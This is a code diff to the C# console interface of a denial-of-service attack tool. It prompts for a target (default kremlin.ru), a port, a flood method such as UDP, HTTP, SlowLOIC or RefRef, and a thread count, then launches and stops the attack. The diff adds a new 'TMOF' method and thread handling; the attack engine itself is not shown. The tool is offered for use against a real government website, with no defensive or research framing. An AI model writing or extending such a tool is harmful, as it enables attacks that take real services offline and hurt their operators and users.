@@ -29,6 +29,7 @@ namespace GAS.TUI
 
                 }
             #endregion
+            #region Select target
             Console.WriteLine("Select target[kremlin.ru]");
             temp = Console.ReadLine();
             temp = (temp == "" ? "kremlin.ru" : temp);
@@ -44,12 +45,14 @@ namespace GAS.TUI
                 Console.WriteLine("Wrong Target!");
                 Environment.Exit(1);
             }
+            #endregion
+            #region GetParams
             Console.WriteLine("Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite);
             if (Console.ReadLine().ToLower() == "y")
                 Core.Subsite = Console.ReadLine();
             Console.WriteLine("Enter port[80]");
             Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
-            Console.WriteLine("Select attack type [ReCoil] (UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme|Post)");
+            Console.WriteLine("Select attack type [ReCoil] (UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme|Post|TMOF)");
             Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), (temp=Console.ReadLine())==""?"ReCoil":temp);
             Console.WriteLine("Enter thread count[50]");
             Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
@@ -70,12 +73,15 @@ namespace GAS.TUI
             Console.WriteLine("Append RANDOM Chars 2 Url [true]");
             Core.AppendRANDOMCharsUrl = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
             Console.WriteLine("Starting attack");
+            #endregion
             Core.Start();
             Console.WriteLine("Attacking...");
             Console.WriteLine("Press Enter stop attack and exit");
-            new Thread(new ThreadStart(stats)).Start();
+            Thread t = new Thread(new ThreadStart(stats));
+            t.Start();
             Console.ReadLine();
             Core.Stop();
+            t.Abort();
         }
         static void stats()
         {
